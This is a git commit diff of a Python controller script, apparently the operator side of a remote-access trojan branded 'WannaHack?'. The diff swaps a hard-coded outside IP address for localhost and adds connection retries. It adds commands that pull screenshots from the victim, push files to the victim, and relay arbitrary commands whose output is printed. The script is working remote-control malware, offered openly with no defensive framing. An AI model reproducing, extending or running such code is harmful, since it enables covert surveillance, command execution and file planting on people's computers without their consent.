5a301de5e9f1ba7cfa0f89752ce4641158fd88fa
Foliowiec <102470363+Foliowiec@users.noreply.github.com>
2024-04-15 16:20:28 +0200

    Update control.py

--- control.py
+++ control.py
@@ -1,6 +1,4 @@
 import base64
-import ctypes
-import datetime
 import getpass
 import os
 import socket
@@ -9,20 +7,24 @@ from colorama import Fore
 import ast
 
 PORT = 55555
-IP = "138.2.151.66"
+IP = "localhost"
 FULLADDRESS = (IP, PORT)
 
 ENCODING = 'utf-8'
-HEADER = 1000000
+HEADER = 1024
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(FULLADDRESS)
+
+while True:
+    try:
+        client.connect(FULLADDRESS)
+        break
+    except ConnectionRefusedError:
+        pass
 
 client.send(f"{getpass.getuser()}@adminconsole".encode())
 
 print(Fore.RED + art.text2art("WannaHack?"))
-
-
 
 
 def send(message):
@@ -32,35 +34,41 @@ def send(message):
     for message in chunks:
         client.send(message)
 
+
+def bytestofile(filepath, bytes):
+    with open(filepath, 'wb+') as file:
+        file.write(bytes)
+        file.close()
+
+
 while True:
     command = input(Fore.LIGHTWHITE_EX + "\n > " + Fore.GREEN)
     if len(command) > 0:
         args = command.split(" ")
-        chunksout = ""
         if args[0] == "screenshot":
             send(command.encode())
             chunks = client.recv(HEADER).decode()
-            for _ in range(int(chunks)):
+            chunksout = ""
+            for i in range(int(chunks)):
                 chunksout += client.recv(HEADER).decode()
-
-            with open('screenshot.png','wb') as ss:
-                ss.write(base64.b64decode(chunksout.strip('][').split(', ')[0]))
-                ss.close()
+            for chunk in ast.literal_eval(chunksout):
+                bytestofile("screenshot.png",
+                            base64.b64decode(ast.literal_eval(base64.b64decode(chunk).decode().split('|')[-1])))
+                os.system(f"start msedge.exe file:///{os.getcwd()}//screenshot.png")
+        elif args[0] == "upload" and len(args) > 1:
+            bs = '\\'
+            if len(args) > 1 and os.path.exists(args[1]):
+                with open(args[1], 'rb+') as file:
+                    filebytes = file.read()
+                    file.close()
+            send(f"upload {os.path.normpath(args[1]).split(bs)[-1]}|{base64.b64encode(filebytes)}".encode())
         else:
-            if args[0] == "upload" and len(args) > 1:
-                bs = '\\'
-                if len(args) > 1 and os.path.exists(args[1]):
-                    with open(args[1],'rb+') as file:
-                        filebytes = file.read()
-                        file.close()
-                send(f"upload {os.path.normpath(args[1]).split(bs)[-1]}|{base64.b64encode(filebytes)}".encode())
-            else:
-                send(command.encode())
+            send(command.encode())
             chunks = client.recv(HEADER).decode()
-            for _ in range(int(chunks)):
+            chunksout = ""
+            for i in range(int(chunks)):
                 chunksout += client.recv(HEADER).decode()
             chunksout = ast.literal_eval(chunksout)
             for chunk in chunksout:
                 decoded = base64.b64decode(chunk).decode(errors="ignore")
                 print(Fore.RESET + decoded)
-
